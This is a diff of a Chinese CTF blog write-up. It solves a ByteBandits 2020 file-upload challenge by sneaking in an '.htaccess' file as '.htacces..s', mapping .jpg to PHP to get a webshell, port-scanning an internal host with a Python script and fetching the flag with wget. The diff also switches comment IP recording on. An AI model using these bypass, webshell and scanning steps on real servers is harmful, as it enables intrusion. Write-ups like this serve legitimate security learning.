Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = os.path.join(os.curdir, <span class="string">"uploads"</span>)</span><br><span class="line"><span class="comment"># app.config['UPLOAD_FOLDER'] = "/uploads"</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">1</span>*<span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">app.secret_key = <span class="string">b'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'s'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">    os.mkdir(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_filename</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r"(\.\.|/)"</span>, <span class="string">""</span>, filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/upload", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    caption = request.form[<span class="string">"caption"</span>]</span><br><span class="line">    file = request.files[<span class="string">"image"</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        flash(<span class="string">'No selected file'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">        flash(<span class="string">'Please upload images only.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.headers.get(<span class="string">"X-Real-IP"</span>):</span><br><span class="line">           ip = request.remote_addr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           ip = request.headers.get(<span class="string">"X-Real-IP"</span>)</span><br><span class="line">        dirname = md5(ip.encode()).hexdigest()</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        upload_directory = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(upload_directory):</span><br><span class="line">            os.mkdir(upload_directory)</span><br><span class="line">        upload_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], dirname, filename)</span><br><span class="line">        file.save(upload_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"uploaded.html"</span>, path = os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/view/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"view.html"</span>, path = path)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/uploads/&lt;path:path&gt;")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="comment"># TODO(noob):</span></span><br><span class="line">    <span class="comment"># zevtnax told me use apache for static files. I've</span></span><br><span class="line">    <span class="comment"># already configured it to serve /uploads_apache but it</span></span><br><span class="line">    <span class="comment"># still needs testing. I'm a security noob anyways.</span></span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], path))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from flask import Flask, render_template, request, flash, redirect, send_file
+from urllib.parse import urlparse
+import re
+import os
+from hashlib import md5
+import asyncio
+import requests
 
+app = Flask(__name__)
+app.config[&#39;UPLOAD_FOLDER&#39;] = os.path.join(os.curdir, &quot;uploads&quot;)
+# app.config[&#39;UPLOAD_FOLDER&#39;] = &quot;/uploads&quot;
+app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 1*1024*1024
+app.secret_key = b&#39;_5#y2L&quot;F4Q8z\n\xec]/&#39;
+ALLOWED_EXTENSIONS = {&#39;png&#39;, &#39;jpg&#39;, &#39;s&#39;}
+
+if not os.path.exists(app.config[&#39;UPLOAD_FOLDER&#39;]):
+    os.mkdir(app.config[&#39;UPLOAD_FOLDER&#39;])
+
+def secure_filename(filename):
+    return re.sub(r&quot;(\.\.|/)&quot;, &quot;&quot;, filename)
+
+def allowed_file(filename):
+    return &#39;.&#39; in filename and \
+           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
+
+@app.route(&quot;/&quot;)
+def index():
+    return render_template(&quot;home.html&quot;)
+
+@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])
+def upload():
+    caption = request.form[&quot;caption&quot;]
+    file = request.files[&quot;image&quot;]
+
+    if file.filename == &#39;&#39;:
+        flash(&#39;No selected file&#39;)
+        return redirect(&quot;/&quot;)
+    elif not allowed_file(file.filename):
+        flash(&#39;Please upload images only.&#39;)
+        return redirect(&quot;/&quot;)
+    else:
+        if not request.headers.get(&quot;X-Real-IP&quot;):
+           ip = request.remote_addr
+        else:
+           ip = request.headers.get(&quot;X-Real-IP&quot;)
+        dirname = md5(ip.encode()).hexdigest()
+        filename = secure_filename(file.filename)
+        upload_directory = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname)
+        if not os.path.exists(upload_directory):
+            os.mkdir(upload_directory)
+        upload_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname, filename)
+        file.save(upload_path)
+        return render_template(&quot;uploaded.html&quot;, path = os.path.join(dirname, filename))
+
+@app.route(&quot;/view/&lt;path:path&gt;&quot;)
+def view(path):
+    return render_template(&quot;view.html&quot;, path = path)
+
+@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)
+def uploads(path):
+    # TODO(noob):
+    # zevtnax told me use apache for static files. I&#39;ve
+    # already configured it to serve /uploads_apache but it
+    # still needs testing. I&#39;m a security noob anyways.
+    return send_file(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], path))
+
+if __name__ == &quot;__main__&quot;:
+    app.run(port=5000)</code></pre>
 <p>发现几个信息。首先是uploads路由里存在明显的提示。暗示我们/uploads_apache/路径</p>
 <p>然后是文件名的检查。很奇怪的是文件名的白名单里有个s.之后先调用<code>allowed_file()</code>进行文件后缀检查，然后调用<code>secure_filename()</code>进行文件名检查<br>第一个函数只检查最后一个<code>.</code>后的后缀。而第二个函数将<code>..</code>替换为空<br>那么这必然存在绕过.联系到这是一个apache服务器,且只允许图片上传。考虑上传<code>.htaccess</code>进行getshell<br>同时为了绕过文件名，使用<code>.htacces..s</code><br>第一个函数检查时判定后缀为s,在白名单内。<br>第二个函数将..替换为空，成功达到上传<code>.htaccess</code>的效果</p>
 <p>内容<br><code>addtype application/x-httpd-php .jpg</code><br>成功上传,直接上传图片马getshell。</p>
 <p>getshell后发现没有flag.比赛时题目有提示flag在secretserver:1337。所以方便直接下手。靶机没有curl，那就直接wget即可。</p>
 <p>不过就算不知道提示也可以做，容器里有python3，那就肯定可以探测端口<br>从/etc/hosts得知ip为192.168.128.2.那就顺着探吧。<br>用上忘记从哪位大佬那嫖来的脚本，做buu时用过。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'192.168.128.3'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import socket
+def foo():
+    with open(&#39;active_port.txt&#39;,&#39;at&#39;) as f:
+        for i in range(65535+1):
+            ip = &#39;192.168.128.3&#39;
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip,i))
+                s.close()
+                f.writelines(str(i)+&#39;\n&#39;)
+            except socket.error:
+                pass
+        f.close()
+    pass
 
+if __name__ == &#39;__main__&#39;:
+    foo()
+    print(&#39;ok&#39;)</code></pre>
 <p>也可以发现1337端口开放。<br>先<code>wget 192.168.128.3:1337</code>得到index.html<br>其中内容提示了./flag.txt<br>直接<code>wget 192.168.128.3:1337/flag.txt</code>即可<br><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/flag0.PNG" class="lazyload" data-srcset="flag0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/" target="_blank" rel="noopener">https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/</a></p>
 
@@ -720,7 +914,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -732,9 +926,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -867,6 +1061,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1080,7 +1276,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1136,6 +1332,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
